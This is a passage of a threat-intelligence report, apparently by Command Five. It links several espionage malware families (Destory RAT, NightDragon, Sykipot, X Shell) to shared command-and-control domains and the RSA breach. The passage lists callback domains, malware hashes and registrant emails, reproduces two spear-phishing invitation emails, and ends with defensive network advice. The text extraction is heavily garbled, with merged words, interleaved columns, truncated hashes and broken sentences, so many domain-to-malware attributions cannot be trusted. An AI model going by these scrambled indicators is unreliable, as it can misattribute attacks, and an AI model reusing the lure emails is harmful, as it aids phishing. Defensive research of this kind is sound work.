KoreanBBvictim.\tThis\tsuggeststhat\ttheLURK,\tBB and\tDB malware may\talso\thave the same DNS functionality\tasX Shell,\talthoughit\tis\tpossiblethat thevictimsareconfiguredto\tusetheGoogleservers astheirregularDNS\tservers,\tand\tthat\tthemalwareis not\tusing\tdifferent\tservers. 44TCPports\t80\tand\t443arecommonly\tused\tforlegitimateHTTP and\tHTTPSactivityrespectively,and\tas\tsuch\tcommunications\tto theseports\tareoftenallowedthrough\tfirewalls.Theobservedcommunicationshavelinkstoavariety of\tmalwareand\tto\tanumberof\tattacks,\tasillustrated inFigure9,\tand\tdetailedbelow. The \u2018Update?\u2019 communications and\tthe Oscar communicationsarebothassociated\twiththeDestory RAT\tfamilyofmalware.Thismalwarefamily\thasbeen used\tinanumberof\ttargeted\tattacksincluding\tthe July\t2011\tSKCommunicationshack.\tThroughshared infrastructurethemalwarehaslinkstotheseriesof coordinated, covert and targeted cyber attacks dubbed\t\u2018NightDragon\u201945,\tand\talso\tto\ttherecent\tseries of targeted attacks that have used RAT\tmalwarealso\thaslinksto\tsocially\tengineered emailsincluding\tthosethattargeted\texpertsonthe relationship\tof\ttheUnited\tStateswith\tJapan,\tChina and\tTaiwan.TheDestoryRAT\tisalso\tconnectedto LURK\tmalware via a compromised\tcode signing certificatewhich\twasusedto\tsignboth\tpiecesof malware,andtoIP2Bcommunicationsby\tashared callbackdomain. The X ShellRAT has been used in numerous attacksbut\tmany\tof\ttheseattacksarenot\texpected\tto beassociated\twith\tthesameattackers.Ontheother hand,\tthecallbackdomainsused\tbyMurcymalware suggest\tthat\tthemalwareisused,\tperhaps\tsolely,\tby IP addresses, to which \u2018alyac.org\u2019 and its the subdomains previously pointed, associate domain,andtheattackersbehindit,witharaft\tof activity.\tThis\tincludes activity\tinvolving\tcallback domainsregistered\ttoappearasthoughthey\twere associated with legitimate, trusted entities, and domainsregistered\tto\ta\u2018LeeCooper\u2019that\ttiebackto 45The NightDragon series of attacks\tbegan in, or prior to, November 2009 and targeted global\toil and petrochemical companies.(McAfeeFoundationProfessionalServices\tandMcAfee Labs,2011) 46Sykipot is a family\tof malware used since 2007 to steal intellectualproperty.Themalwarehasbeenusedinaseriesof sociallyengineered\temailcampaigns\tagainstavarietyofsectors. Onanumberofoccasions,theattackershaveexploitedzeroday vulnerabilities\tto install the the malware. Some variants\tof malware include features\tthat enable\tit to hijack\tsmartcards. (Thakur,2011)(Lelli,2010)(Blasco,2012) COPYRIGHT\u00a9\tCOMMANDFIVEPTY\tLTD.ALLRIGHTSRESERVED.NAME\tSERVERSPAGE11OF\t29SK Communications hack*.duamlive.com sec.netTargeted\temails pu.flower show.org www.mailsignin.net 123.netwww.adv138mail.com newhose.ntimobile.com sms.servegame.com way.com*.newcarstyle .comSykipotFIGURE9:ILLUSTRATIONOFLINKSSeveral\ttargeted BB\tprotocol*.mail kr2.com COPYRIGHT\u00a9\tCOMMANDFIVEPTY\tLTD.ALLRIGHTSRESERVED.IP2B malware wow.travlman.com PAGE12OF\t29*.topix21 century.comro.diggfunny.com bbs.ezxsoft.com\u2018LeeCooper\u2019 malware*.windowupdate.orgpc.nprotects Trojan.Win32.Generic .ddns.usNightDragonSocially\tEngineered Emailsnamed thecallbackdomain\u2018vupdate.mail kr2.com\u201947,\twhile NightDragonmalwareis\tknownto\tcommunicatewith \u2018ma2.mail kr2.com\u201948and \u2018www2.mail kr2.com\u201949. The communications sent to\t\u2018www2.mail kr2.com\u2019 similar 50, but not activity.\tOther \u2018mail kr2.com\u2019 subdomains include \u2018sa****.mail kr2.com\u2019, \u2018cb85.mail kr.com\u2019, and \u2018skylie.mail kr2.com\u2019\t  at\tleast\ttwo of\twhich\tare knowntobeassociatedwithmalware51. Destory\tRAT\tmalware is known to\tuse the callback domain \u2018bbs.afbjz.com\u201952, while known NightDragon malware uses the callback domain \u2018blog.afbjz.com\u201953.\tAsof\t3\tFebruary\t2012,bothofthe This\toverlap in infrastructure appears to be of particular significance given the following Asof\t6February2012,thedomains\u2018gmail.mail  ru2.com\u2019, \u2018mail ru2.com\u2019, \u2018live.mail ru2.com\u2019, \u2018usaisbig.oerco.com\u2019, \u2018msn.mail ru2.com\u2019, \u2018www.afbjz.com\u2019, \u2018whois.oerco.com\u2019, and \u2018www2.oerco.com\u2019 otherwiseknowntobeassociated\twith\tmalware54. 47TheDestoryRATwith\tMD5\thash\u201895558985D211\tF768\t1ACC 1AC9 2DCB 07C8 A096 B403\u2019 uses the callback location \u2018vupdate.mail kr2.com\u2019. 48MalwarewithMD5\thash\t\u20182D8A9038E151FB30D45EA866 8AFD\t2A8E\u2019,knowntocallback\tto\u2018ma2.mail kr2.com\u2019,is\tdetected byantivirus\tsoftwareas\t\u2018TrojanDropper:Win32.RedSip.A\u2019,analias forNightDragonmalware.(ThreatExpertLtd.,2010) (Hispasec Sistemas,2011)(Kurc,2011) 49MalwarewithMD5hash\u20185BC597E48270F04EC9B68343 2432 E352\u2019, known to call back\tto \u2018www2.mail kr2.com\u2019, is detected\tbyantivirussoftwareas\t\u2018Backdoor:Win32/RedSip.A!svc\u2019, an alias\tfor NightDragon malware. (Sunbelt Security, 2010) (HispasecSistemas,2010) 50Both\tcommunications\tbeginwith\ta16byteheadercontaining\tthe protocolidentifier\u20180x12345678\u2019\tand\tadatasize,and\tthedatain both\tcontains\tsimilarsysteminformationbutinadifferentorder. 51Maliciousfiles\tareseparately\tknowntoattemptcommunications with\u2018sa*****.mail kr2.com\u2019\tonTCP\tport8000,and\t\u2018cb85.mail  kr2.com\u2019\tonTCP\tport6543.\t(DoctorWeb,2011)(SunbeltSecurity, 2011) 52The domain \u2018bbs.afbjz.com\u2019\tis a known callback domain of DestoryRATmalwarethatis\tdetected\tbyantivirussoftwareas both\tBackdoor:Win32/Thoper.Aand\tBackdoor.Sogu.(Wong,\t2011) (Mullaney,2011) 53The domain \u2018blog.afbjz.com\u2019\tis\ta known callback\tdomain of NightDragonmalwarethatisdetectedbyantivirussoftwareas \u2018Trojan.Dropper:Win32/Redsip.A\u2019.(Kurc,2011) \u2018Trojan.DownLoader4.8565\u2019 communicates us****ig.oerco.comonTCPport100.(Dr.Web,2011) PAGE13OF\t29 COPYRIGHT\u00a9\tCOMMANDFIVEPTY\tLTD.ALLRIGHTSRESERVED.The\u2018oerco.com\u2019domainis\tregistered\tto\tthesame personas\u2018afbjz.com\u201955,\tassociating\tthetwodomains with\ta single entity.\tThe \u2018mail ru2.com\u2019 domain appearsto\tbeassociated\twith\tthesameentity\tasthe \u2018mail kr2.com\u2019domainusedby\tNightDragonmalware and\ttheDestroyRAT\t(asdescribed\tabove).\tWhilethe domainswereregisteredusing\tdifferent\tdetails,\tthey wereregistered\tonthesameday\tthrough\tthesame domainnameregistrar,\tand\ttherecords\tlaterupdated minutesapart56.\tThis\tsuggeststhat\tallC2\tactivity involving Therecently\texpired\tdomain\u2018todaygonever.com\u2019 also\tpreviously\tpointed\tto\tthesameIP\taddress.\tAs is directly associated with \u2018todaygonever.com\u2019 malwareand\thaslinksto\ttherecent\tseriesof\tSykipot pointed\tto\tthe same IP\taddress and\twere likely associated\twiththesameattackers. Other Destory RAT callback domains are also otherwiselinkedtomaliciousactivity.\tForexample, the callback domain 'www.adv138mail.com'57was used\tby\ta Poison Ivy\tRAT58sent\tin a July\t2011 socially\tengineered\temail campaign. The emails Agenda.pdf\u2019, which Vulnerabilitiesand\tExposure(CVE)number2010  288359to\tinstallthePoisonIvyRAT.\tAcleandecoy PDFfilewasshowntotheuserwhentheattachment wasopened.Acopy\tof\tthetext\tusedinthesocially 55Both\tdomains\tareregisteredtoapersonwhosecontactemail addressis\t\u2018madconnon@126.com\u2019.Thenameand\taddressdetails areidenticalforboth\tdomainregistrations. 56Thedomain\u2018mail kr2.com\u2019\twas\tlastmodified\ton24February 2012 at 1:40:32, while\tthe domain \u2018mail ru2.com\u2019\twas\tlast modified on the same day at 1:43:53. Both\tdomains were registered\tthrough\t35\tTechnology\tCo.,Ltdon8March\t2010. 57Thedomain\u2018www.adv138mail.com\u2019\tis\tlisted\tas\taBackdoor.Sogu callback.(Mullaney,2011) 58ThePoisonIvyRATis\tanadvanced\tremoteadministrationtool forWindows.Both\tfreeand\tpaid\tversionsoftheRATareavailable. (shapelessn.d.) 59CVE2010 2883refers\ttoaparticularvulnerabilityincertain versions\tofAdobeReaderand\tAcrobatwhichanattackercanuseto take\tcontrol\tofaffected\tWindows,Macintosh\tand\tUNIXsystems. (AdobeSystemsIncorporated\t2010) 60Email\tcourtesyofMila\tParkourof\u2018contagiodump.blogspot.com\u2019. (Parkour2011)is detected byDear <recipient>,Dear Sir/Madam,willbeits Implications forThe Sasakawa Peace Foundation would like to extend to you an invitation to be our guest speaker at the America\u2019s Strategic U.S.- Japan Alliance. As you know, the Sasakawa Peace Foundation is interested in the U.S.- Japan Alliance Since you are familiar with the field, we interesting to us. please find enclosed further details, we would appreciate having acceptance soon so we may complete our agenda.youryour\ufffd <purported sender>FIGURE10:TEXTOFASOCIALLYENGINEERED EMAILASSOCIATEDWITHWWW.ADV138MAIL.COM The domain \u2018www.adv138mail.com\u2019 is also associated with malware detected by antivirus software as \u2018Backdoor.Win32.Delf.abow\u201961. Other knownsubdomainsinclude: \u2018asm.adv138mail.com\u2019, \u2018dns.adv138mail.com\u2019, \u2018ftp.adv138mail.com\u2019, \u2018ihi.adv138mail.com\u201962, \u2018nov.adv138mail.com\u2019. Thesedomains(withthepossibleexceptionof the\u2018dns\u2019and\u2018ihi\u2019subdomains)haveallpointedtothe same infrastructure63as the domains \u2018pu.flower  show.org\u2019 and \u2018www.mailsignin.net\u2019. That\tshared infrastructureis\tknownto\thavebeenused\ttosend socially engineered emails that contained an attachment\tnamed\t\u2018invtation.pdf\u2019[sic].\tSimilarto\tthe \u2018Meeting\tAgenda\u2019 attachment,\t\u2018invtation\u2019 installs a PoisonIvy\tRAT,\tbutoneconfiguredtocommunicate with\tthecallbackdomain\u2018pu.flower show.org\u201964.\tThe 61ThemalwarewithMD5hash\u2018F0B8\t48A8\t41D4EF3406A6\tF9C4 766C\t540B\u2019modifies\tthe\u2018hosts\u2019fileoncomputers\titisrunonso that the file contains an entry for \u2018www.adv138mail.com\u2019. (ThreatExpertLtd.,2011) \u2018ihi.adv138mail.com\u2019 Backdoor:Win32/Thoper.Acallback\tlocation.(Wong,\t2011) 63Thedomains\tpreviouslypointed\ttoaC2\tserverlocated\tatIP 64The socially engineered\temail that communicated back\tto thesameIP\taddresstowhich\tthecallbackdomainpointed. 65Email\tcourtesyofMila\tParkourof\u2018contagiodump.blogspot.com\u2019. (Parkour,contagio:Jul5\tCVE 2010 2883PDF\tinvitation.pdfwith seminar about technology, which will be held on 28th,July.We would appreciate it if you would take your spare time to share the occasion with us. The detail information is in the attachment. Please earlist convenience. Looking forward to your reply.Thanks very much.participationyouratAdditional Destory\tRAT LinksBest Regards, <purported sender>FIGURE11:TEXTOFASOCIALLYENGINEERED \u2018www.adv138mail.com\u2019, \u2018www.mailsignin.net\u2019 has also previously shared infrastructurewith\tat\tleast\ttwootherknownDestory \u2018www.mailsignin.net\u2019 previously pointed RAT\tcallbackdomains\u2018newhose.ntimobile.com\u2019and \u2018sms.servegame.com\u201966.\tAnumberof\tsubdomainsof theDestory\tRAT associated\tdomain\u2018join3com.com\u2019 also\tpreviously\tpointed\ttothesameIPaddress67. Theselinkssuggestthat\tmany\tattacksinwhich theDestory\tRAT\thasbeenused\tarelinked,\tnot\tonly by\tthemalware,but\talso\tthroughC2infrastructure. This\tfurthersupportsthenotionthattheDestory RAT\twasdevelopedby,\torfor,particularattackers and\tthat\tmost,\tifnot\tall,\tof\tthemaliciousactivity involvingit\tis\tattributabletothoseattackers. additional malware. For example, \u2018network sec.net\u2019hasbeenused\tby\ttheDestory\tRAT (\u2018gm1.network sec.net\u2019), by Poison Ivy malware \u2018Backdoor FCQ\u2019 (\u2018yoyo.network sec.net\u201968) and\tby 66Thedomains\u2018newhose.ntimobile.com\u2019and\u2018sms.servegame.com\u2019 arelistedasknowncallbacksforBackdoor.SoguandThoper.A respectively.(Wong,\t2011)(Mullaney,2011) \u2018123.join3com.com\u2019, \u2018dow.join3com.com\u2019,\u2018ftp.join3com.com\u2019,and\t\u2018ico.join3com.com\u2019are Backdoor:Win32/Thoper.Acallback\tlocation.(Wong,\t2011) 68Thedomain\u2018yoyo.network sec.net\u2019\tis\tused\tbymalwarewith MD5\thash\u201837037F674BCB\tBB7EEF3889AB\t6EB3\t0268\u2019.(Threat ExpertLtd.,2008) PAGE14OF\t29\u2018join3com.com\u2019 \u2018catalog.join3com.com\u2019COPYRIGHT\u00a9\tCOMMANDFIVEPTY\tLTD.ALLRIGHTSRESERVED.Compromised Code\tSigning CertificateTravlman LinkstheLink to\tRSA Breach(\u2018pingabm.network sec.net\u2019,\u2019 \u2018psbm11025.network  sec.net\u2019and\t\u2018psbm10.network sec.net\u201969). TheobservedLURK\tcommunicationsappearto\tbethe same as those generated by malware that\twas digitally\tsigned\tusing\tacompromised\tcodesigning certificatethat\twasused\ttosignaDestory\tRAT,\tand in several attacks70.\tThat other malware used \u2018office.windowupdate.org\u2019\u2013adomainthat\tis\tlinkedto \u2018alyac.org\u2019not\tonly\tby\tthecommunicationsprotocol but\talso\tby\tboth domain registration tactic and infrastructure71.\t(Fagerland,\t2011) The Destory RAT malware used Communications hack72is\tidentical,\texcept for its configuration,to\tmalware73that\tcommunicateswith callback domain \u2018wow.travlman.com\u2019. The the callbackdomainpreviouslypointed\tto\tthesameIP address as that\tused\tin the SK\tCommunications hack74.\tBoth\tof\tthemaliciousfileswerecompiled from the same code on 27\tSeptember 2010\tat 09:17:04GreenwichMeanTime(GMT)75,\tandlater configured. Thecallbackdomain\u2018wow.travlman.com\u2019is\talso by malware 76 communications of\tan identical format\tto\tthose decoded from the in the Murcy \u2018Extra Data\u2019 communications.\tThis\thighlightsanadditionallink 69Backdoor FCQ uses\tseveral\t\u2018network sec.net\u2018\tsubdomains\tas callbacklocations.(McAfeeInc.,2011) 70Thefirstreported\tabuseofthecertificatewasinrelationtothe HupigontrojanwithMD5\thash\t\u20188800839871A3\t3801B2B46F9E 23B7\tB7A5\u2019. (Hispasec Sistemas, 2011) (Common Computer SecurityStandards) 71Refer to the \u2018LURK Communications\u2019 section for additional information. 72TheDestoryRATused\tintheSK\tCommunications\thack\twas hosted on a toolbox as \u2018nateon.exe\u2019, and called back to \u2018nateon.duamlive.com\u2019.Ithas\taSHA1\thashof\u2018F84CD73DABF1 86607F98\t6DF9\t8C5402A5\t7BB58AD1\u2019\tand\tMD5\tof\u2018461884F1 D41E9E0709B4\t0AB2\tCE5AFCA7\u2019.(CommandFivePtyLtd,2011) 73Malwarewith\ttheMD5\thash\u20185FCE1FC18283D76C396A3CCC 64BDBBDE\u2019\tcallsbackto\u2018wow.travlman.com\u2019. 74Both\t\u2018wow.travlman.com\u2019\tand\t\u2018duamlive.com\u2019\tpreviouslypointed listed\tinanyblacklists,2011)(DomainTools,LLC) 75Automatedanalysisreportsconfirmthecompilationtimeofthe codeand\tthat,whiletheMD5\thashofeach\tofthefiles\tis\tdifferent, theMD5\thashes\tofeach\tofthecodesections,exceptforthe.data section, are identical. (Hispasec (Hispasec Sistemas, 2011) Sistemas,2011) 76Malwarewith\tMD5\thash\u2018B098\tAEE1\t6BD1\t38C4\t12075C9D 315A\tEFC9\u2019.(ThreatExpertLtd,2010) PAGE15OF\t29between the Destory RAT Several other \u2018travlman.com\u2019 sub domains are known to\texist77including at\tleast\tone that\tis The associated with malware. sub domain \u2018dm.travlman.com\u201978is\tthecallbackused\tby\tmalware \u2018Trojan:Win32/Boupke\u201979. The majority\tof\tthe known callback domains for MurcymalwarewereusedintheMarch\t2011RSA breach.\tThissuggeststhat\ttheattackersresponsible fortheRSA breach\talso\tusetheMurcymalware. Given that the malware is reportedly not in widespread\tuse,\ttheChineseservercommunicating with\u2018path.alyac.org\u2019may\thavebeencompromisedby thesameattackersresponsiblefortheRSA\tbreach. TheX ShellRAT\tis\tcommercially\tavailablesoftware that\tappears to\thave been used in a number of attacks.\tTherearenumerousversionsof\ttheX Shell RAT,\tand\tnotallproducethesamecommunications. Malwarethat\tgeneratesthesameX ShellC601 \u2018path.alyac.org\u2019 communications 80 observed That\tmalwareis\tthought\ttobeanX ShellC603\tRAT and\tnot\tanX ShellC601\tRAT.\tIt\tis\tnot\tknownwhether any\tofthesemaliciousfileswereused\tbythesame \u2018g.travlman.com\u2019, \u2018dm.travlman.com\u2019, \u2018g1.travlman.com\u2019, \u2018g2.travlman.com\u2019, \u2018mail.travlman.com\u2019, \u2018luandao.travlman.com\u2019, \u2018seo.travlman.com\u2019, \u2018wayi.travlman.com\u2019, \u2018shenqi.travlman.com\u2019, and\t\u2018www.travlman.com\u2019. 78Malwarewith\tMD5\thash\u201870A8\t8091E1F9\tA7BEE246\t488C \u2018url\u2019.(SunbeltSecurity,2009) 79Malwarewith\tMD5\thash\u201870A8\t8091E1F9\tA7BEE246\t488C \u2018Trojan:Win32/Boupke.gen!A\u2019, \u2018Trojan.Win32.Boupke!IK\u2019, and \u2018Trojan.Win32.Boupke\u2019.(HispasecSistemas,2009) 80Automated\tanalysis\treports\texistontheInternetforprobable\tX  Shell601\tmalwarewith\tMD5\thash\u201865813CBB\t660E91CD5FA0 8300E177\tEB09\u2019,\u2018229947CC71A4601B8B7794B402E536A9\u2019, \u2018DA2F98315F4C56FCE21273E21E453B76\u2019,and\u2018F4C08D3D F5EDE0790E34EAE0C5DB8A7A\u2019.(Hispasec Sistemas, 2011) (Threat Expert Ltd, 2011) (Threat Expert Ltd, 2011) (Threat ExpertLtd,\t2011) 81Automated\tanalysis\treports\texistontheInternetforprobableX  Shell603\tmalwarewith\tMD5\thash\u2018679993AD2CF8EFDC788E 0BA204D69B0D\u2019,and\t\u2019CE938C647831080B71165389E43E attackers who\tused\tthe X shell malware which knownSykipotdomain\u2018help.newcarstyle.com\u2019.Both communicateswith\t\u2018path.alyac.org\u2019. subdomains85.\tThey\tthereforehaveadditionallinksto Thedomain\u2018alyac.org\u2019previously\tpointed\tto\taC2 Sykipot\tactivity\tas\u2018shopping.bluelightness.com\u2019was same IP address as the known Sykipot\tdomains IP\taddressesareassociatedwith\tanumberofother \u2018www.topix21century.com\u2019 and \u2018bbs.ezxsoft.com\u2019, \u2018notes.topix21century.com\u201986.\tThe\u2018bluelightness.com\u2019 \u2018pc.nprotects.org\u2019, and \u2018wow.travlman.com\u2019 domainis\talso\tlinked\tto\t\u2018mail kr2.com\u2019 aDestory latterbeing\tlinked\ttoboth\ttheDestory\tRAT\tand\tIP2B RAT\tand\tNightDragondomainpreviously\tdiscussed. communications(aspreviously\tdiscussed)82. Both\tdomainsshareinfrastructurewith\tthedomain \u2018worldsecuritys.com\u201987. In\tadditionto\tbothhaving\tshared\tinfrastructure \u2018bbs.ezxsoft.com\u2019and\t\u2018pc.nprotects.org\u2019areused\tby \u2018file.filesdelete.com\u2019, and \u2018news.welldone123.net\u2019 malwarethat\tcreatesauniquely\tnamed\tdirectory83. \u2018well.welldone123.net\u2019 all point to the IP\taddress This\tindicatesadirect\trelationship\tbetweenthetwo allocated\tto\tthe large US financial which\t\u2018todaygonever.com\u2019also\tpreviously\tpointed.) Thedomain\u2018welldone123.net\u2019is\taknownSykipot Thedomain\u2018ezxsoft.com\u2019wasregistered\tbythe callback domain88.\tThe domain \u2018filesdelete.com\u2019 is sameentity\t(\u2018LeeCooper\u2019)asadomainused\tintheSK also\totherwiseassociated\twith\tmalware89. Communications hack (\u2018ro.diggfunny.com\u2019),\tfurther linking\tit\tto\tthesameattackers.\tTheC2\tserverand\tthe in the domain callbackdomainsalso\thavelinksto\tamyriad\tof\tother \u2018janagreen2000@gmail.com\u2019.\tThesamecontact\temail address(but\tdifferent\tname,\taddress,\tand\tphoneand in the domain fax numbers) was also used As previously discussed, before expired, registration for \u2018centurycpc.com\u2019, \u2018filesdelete.com\u2019, \u2018todaygonever.com\u2019pointedto\taC2serverassociated with both the Destroy RAT and NightDragon \u2018newcarstyle.com\u2019\u2013at\tleast\ttwoofwhich\tareknown malware.\tThesamedomainis\talso\tassociated\twith infrastructure,\tand\tdomainregistrationinformation. Overits\tlifetimethedomain\u2018todaygonever.com\u2019 pointedto\tnumerousIP\taddresses,\tmany\tof\twhich\tare IP address \u2018helpdesk.bluelightness.com\u2019 previouslyhosted\t\u2018shopping.bluelightness.com\u2019. not\tnoteworthyasthey\twereassigned\tto\tserversthat hosted\tnumerouswebsites.\tFourof\ttheIP\taddresses, \u2018notes.topix21century.com\u2019, \u2018shopping.bluelightness.com\u2019, \u2018www.topix21century.com\u2019. The webpage \u2018topix21century.com\u2019 however,\tare of\tparticular note \u2013 IP\taddresses was\tused,inwhatis\tbelieved\ttohavebeenatargeted\tattack,to installSykipotmalwareoncomputers\twhich\tvisited\tthewebpage. The installed malware then communicated with a C2 server \u2018notes.topix21century.com\u2019. (Symantec Corporation, located at allocated\tto\talargeUSfinancialinstitution. 2010)(MalwareGroup.com) 87In2011boththeknowncallback\tdomain\u2018cb85.mail kr2.com\u2019 the later still points\tthere as\tof 9\tFebruary 2012. In 2011, \u2018bluelightness.com\u2019\tand\u2018worldsecuritys.com\u2019\tboth\tpointed\ttoIP 82Malware detected as 'Trojan.Win32.AgentBypass' uses\tthe 2012. 'bbs.ezxsoft.com'. Malware \u2018Trojan.Win32.Generic\u2019\tusesthecallback\tdomain\u2018pc.nprotects.org\u2019. 88Thedomain\u2018welldone123.net\u2019\tisknowntobeassociatedwith (GFISandBox2011)(GFISandBox2011) theSykipotseries\tofattacks.(SymantecCorporation,2012) \u2018www.filesdelete.com\u2019 89 The 83 Both pieces of malware is associated with domain \u2018Troj/Bdoor BDM\u2019.(Sophos\tLtd.,2012) \u201803a075fb70d5d675f9dc26fc\u2019\tand\tasubdirectorynamed\t\u2018update\u2019. (GFISandBox2011)(GFISandBox2011) 90Thedomain\u2018help.newcarstyle.com\u2019\tisaknownSykipotcallback, asis\u2018greenrightway.com\u2019.(SymantecCorporation,2012)(Malware 84Forfurtherdetails\tofthelinks,refertothepaper\u2018SKHack\tbyan Domains,2012) AdvancedPersistentThreat\u2019.(Command\tFivePtyLtd,2011) PAGE16OF\t29COPYRIGHT\u00a9\tCOMMANDFIVEPTY\tLTD.ALLRIGHTSRESERVED.throughofit C2Sykipot Activitydomain\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdINSIGHTSIncreasingly,\tinstead\tof\tmalwareusingthe default\tDNSserversonacompromised computerto\tresolveits\tcallbackdomainsto IP\taddresses,\tattackerswillspecify\tDNS defenders.\tSuch\trequests,\tifallowed,\twill bypassthevictim\u2019sDNSserversand\tdefeat any\tblacklistsused\tby\tthevictim\u2019sownDNS servers.\tFurthermore,\ttherequestswillnot thanthecompany\u2019s\townDNS\tservers. Furthermoretheyshould\tbealert\ttoany\tDNS communicationattempts\ttolocationsother thanthecompany\u2019s\townDNS\tservers,\tasthis may\tbeanindicatorof\tamalwareinfection. \ufffd Whencodesigning\tcertificatesarerevoked thedateof\teffect\tof\ttherevocationis\tchosen so\tthat,\twherepossible,\tlegitimatesoftware signed\twith\tthecertificatecontinuesto validate.\tUnfortunately,\tthismeansthat sometimesmalwaresignedwith\ta compromised\tcertificatewillalso\tcontinueto validate(despitetherevocation). Somemalwareattempts\tto\tcommunicate with\tC2infrastructureat\tfrequent\tintervals. TCP\tport443\ttrafficisoftenallowed\toutofa networkwithout\tinspectionby\tnetwork security\tappliancesasit\tis\texpected\tto\tbe legitimate,\tencrypted\tSSLcommunications that\tcanbedifficult\tto\tinspect.\tUnfortunately,attackerstakeadvantageof\tthisby\tusing\tthe portto\tbypasssecurity\tappliancesto communicatewith\taC2server(such\taswith theobserved\tX Shellcommunications). code,\tsometimesthey\twillmerely reconfigurethemalware.\tThisaltersthefile hash\tand\tthereforesuch\tahash\tis\tnotan effectivesignatureforotherconfigurations of\tthemalware.\tHashesoftheindividualcode sections(e.g text,.rdata,\t.reloc)makefor determinetheirdestination\u2019sIP\taddress. Outboundnetworkactivitythat\toccurs withoutaDNS\tlookupshould\tbetreatedwith Blocking\toutbound\tcommunicationattempts that\tarenot\tpreceded\tby\taDNS\tlookup\tcan beeffectiveinblockingC2\tcommunication attemptsthat\taremadedirect\tto\tanIP address(such\tastoanIP\taddresslisted bewhitelisted\tto\tprevent\tlegitimateactivity callbackdomainevenwhenit\tis\tlisted\ton taking\tthetimeto\tresearch\tthedomainand associated\tactivity\tcanhelp\twith\tthe Machinetranslationsoftwareand\tautomated\tmalwareanalysis\treports havebeenheavily\treliedonthroughout\tthedevelopment\tofthis\tpaper. Whiledatahasbeenverified\tagainstmultiplesourceswherepossible, CommandFivePtyLtddoesnotguaranteetheveracity\tof\tsourcesorthe accuracy\tof\ttheinformation.CommandFivePty\tLtd\treminds\treadersto exercise caution when visiting untrusted websites and/or opening untrusteddigitaldocuments.\tCommand\tFivePty\tLtddoesnotwarrant that\tthewebsitesreferencedinthispaperaretrustworthy. COPYRIGHT\u00a9\tCOMMANDFIVEPTY\tLTD.ALLRIGHTSRESERVED.PAGE17OF\t29DISCLAIMER\ufffd\ufffdREFERENCESBlasco,\tJ.\t(2012,\tJanuary12). Sykipot variant hijacks DOD and Windows smart cards.\tRetrieved\tFebruary\t05,\t2012, fromAlienvault\tLabs:url the apt owns your smart  cards and certs/ CommandFivePty\tLtd.\t(2011,\tJune). Advanced Persistent Threats: A\tDecade\tin Review.Retrieved\tSeptember24, 2011,\tfromCommand\tFivePty\tLtd: url CommandFivePty\tLtd.\t(2011,\tSeptember).\tSK\tHack\tby an Advanced Persistent Threat.\tRetrievedJanuary\t06,2012, fromCommand\tFivePty\tLtd:url CommonComputerSecurityStandards.\t(n.d.).\tDigital\tCertificates Used by\tMalware.\tRetrievedFebruary02,\t2012, fromCCSSForum:url certificates.php?&pag=4 Coviello,\tA.\t(2011,\tMarch\t17).\tOpen Letter to\tRSA Customers.\tRetrieved\tJune13,\t2011,from\tRSA: url Deutsch,\tP.(1996,May).\tDEFLATE\tCompressed Data Format Specification version 1.3.\tRetrieved\tJanuary08,\t2012, fromIETF\tRFC1951:url Deutsch,\tP.(1996,May).\tZLIB Compressed Data Format Specification version 3.3.\tRetrieved\tJanuary\t25,\t2012,\tfrom IETF\tRFC1951:\turl DoctorWeb.\t(2011,December29).\tDr. Web\tAnti virus   How To Remove Virus (Trojan.DownLoader4.20396)   [DRWEBHK.COM].\tRetrieved\tDecember29,\t2011,\tfrom\tDr.\tWebHK: url Dr.\tWeb.(2011,\tJuly\t10). Dr.Web   innovation IT security\tsolutions. Complex protection against Internet threats. Retrieved\t0203,\t2012,from\tDr.Web:\turl Fagerland,\tS.\t(2011,\tNovember17).\tInvisible YNK, a Code\tSigning Conundrum | Norman Blog.\tRetrieved\tDecember 13,\t2011,from\tNorman.com:url detection team/invisble ynk a  code signing conundrum F SecureCorporation.(n.d.). Threat Description: Backdoor: W32/Hupigon.\tRetrieved\tDecember23,\t2011,\tfrom\tF  Secure:\turl secure.com/v descs/backdoor_w32_hupigon.shtml GFI\tSandbox.\t(2010,\tMay\t07).\tGFI Sandbox Analysis Report.\tRetrieved\tJanuary06,\t2011,\tfrom\tGFI\tSandbox: GFI\tSandBox.(2011,August\t04).\tGFI SandBox Analysis Report.\tRetrieved\tOctober17,\t2011,\tfromGFI\tSandBox: GFI\tSandBox.(2011,July\t15).\tGFI SandBox Malware Analysis Report: Trojan.Win32.AgentBypass.\tRetrieved\tAugust GFI\tSandbox.\t(2011,\tSeptember04). GFI Sandbox Malware Analysis Report: Trojan.Win32.Generic.\tRetrieved January\t06,\t2012,\tfromGFI\tSandbox: COPYRIGHT\u00a9\tCOMMANDFIVEPTY\tLTD.ALLRIGHTSRESERVED.PAGE18OF\t29GFI\tSandBox.(2011,May\t29).\tGFI SandBox Malware Analysis Report: Trojan.Win32.Generic!SB Trojan.Trojan.Win32.Generic.\tRetrievedSeptember2011,2011,\tfrom GFI\tSandbox.\t(2011,\tMarch\t20).\tGFI Sandbox Malware Analysis Report: Trojan Dropper.Win32.Wykores.\tRetrieved January\t06,\t2012,\tfromGFI\tSandbox: GFI\tSoftware.(2010,December26). CWSandbox Report by MD5\tat Sunbelt Security.\tRetrieved\tDecember27,2011, fromSunbelt\tSecurity: url 549b6d2ba0 11/52/02 UTC.\tRetrieved\tFebruary02,\t2012,\tfrom\tVirusTotal: ff7f4 17/52/37 UTC\t  VirusTotal.\tRetrieved\tFebruary\t07,\t2012,\tfromVirusTotal: 27c110/analysis/ 13/34/31 UTC\t  VirusTotal.\tRetrieved\tFebruary\t03,\t2012,\tfromVirusTotal: bc1cc/analysis 13/31/35 UTC.\tRetrieved\tFebruary02,\t2012,\tfrom\tVirusTotal: a4fb1fe 09/44/14 UTC.\tRetrieved\tJanuary\t30,\t2012,\tfrom\tVirusTotal: 565b6aa/analysis 18/29/09 UTC.\tRetrieved\tJanuary\t30,\t2012,\tfrom\tVirusTotal: bcab40/analysis HispasecSistemas.\t(2011,\tMay\t10).\tVirusTotal\t  Free\tOnline\tVirus, Malware and URL Scanner.RetrievedDecember 30,\t2011,from\tVirusTotal: d0a162b9a7584f90 HispasecSistemas.\t(2011,\tNovember21).\tVirusTotal\t  Free\tOnline Virus, Malware and URL Scanner.\tRetrieved December30,\t2011,\tfrom\tVirusTotal:\turl  1321864468COPYRIGHT\u00a9\tCOMMANDFIVEPTY\tLTD.ALLRIGHTSRESERVED.PAGE19OF\t29HispasecSistemas.\t(2011,\tDecember21).\tVirusTotal\t  Free\tOnline Virus, Malware and URL Scanner.\tRetrieved December30,\t2011,\tfrom\tVirusTotal:\turl  1324454798 